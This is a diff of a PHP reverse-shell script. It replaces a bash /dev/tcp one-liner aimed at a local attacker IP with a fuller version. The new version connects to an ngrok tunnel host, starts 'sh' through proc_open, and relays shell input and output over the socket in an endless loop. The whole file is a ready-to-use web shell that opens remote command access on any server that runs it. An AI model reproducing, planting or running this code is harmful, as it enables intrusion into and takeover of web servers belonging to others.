@@ -1,12 +1,43 @@
 <?php
-// Set the IP address and port of the attacking machine
-$ip = '192.168.252.129';  // Replace with your attacking machine's IP
-$port = 1234;          // Replace with your desired port
+set_time_limit(0);
 
-// Command to execute a reverse shell
-$command = "/bin/bash -c 'bash -i > /dev/tcp/$ip/$port 0>&1'";
-
-// Execute the command
-exec($command);
-echo "command success";
+// Amend the IP & port
+$sock = fsockopen("0.tcp.ap.ngrok.io", 15704);
+if ($sock) {
+    $descriptorspec = [
+        0 => ['pipe', 'r'], // stdin
+        1 => ['pipe', 'w'], // stdout
+        2 => ['pipe', 'w'], // stderr
+    ];
+    
+    $process = proc_open('sh', $descriptorspec, $pipes);
+    
+    if (is_resource($process)) {
+        // Set non-blocking mode on the socket
+        stream_set_blocking($sock, 0);
+        
+        // Set non-blocking mode on the pipes
+        foreach ($pipes as $pipe) {
+            stream_set_blocking($pipe, 0);
+        }
+        
+        // Copy data between the socket and the shell
+        while (true) {
+            // Check for data from the shell and send it back through the socket
+            if ($output = fread($pipes[1], 1024)) {
+                fwrite($sock, $output);
+            }
+            
+            // Check for data from the socket and send it to the shell
+            if ($input = fread($sock, 1024)) {
+                fwrite($pipes[0], $input);
+            }
+        }
+        
+        fclose($pipes[0]);
+        fclose($pipes[1]);
+        fclose($pipes[2]);
+        proc_close($process);
+    }
+}
 ?>
